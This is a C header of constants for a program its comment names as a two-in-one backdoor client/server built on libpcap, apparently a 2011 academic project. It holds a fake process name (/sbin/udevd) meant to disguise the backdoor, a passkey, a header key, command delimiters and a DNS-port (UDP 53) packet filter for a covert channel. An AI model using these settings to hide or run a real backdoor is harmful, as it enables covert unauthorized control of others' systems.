#ifndef DEFS_H
#define DEFS_H

/*
SOURCE FILE: defs.h

PROGRAM: Backdoor - A simple two in one backdoor client/server using libpcap

DATE: October 23, 2011

REVISIONS:
	1.0 - October 23

DESIGNERS:
	Santana Mach and Steve Stanisic

PROGRAMMERS:
	Santana Mach and Steve Stanisic

NOTES: This file holds the constants used throughout the program.
*/

#define MASK 		"/sbin/udevd"
#define MAX_LEN 1024
#define HDR_KEY "(P^.^)=P"
#define HDR_LEN 8
#define PASSKEY "tessera"
#define KEY_LEN 8
#define DEF_FLT "udp port 53"
#define CMD_STR "start["
#define STR_LEN 6
#define CMD_END "]end"
#define END_LEN 4
#define DEF_PRT 53
#define DEF_ADR "127.0.0.1"

#endif
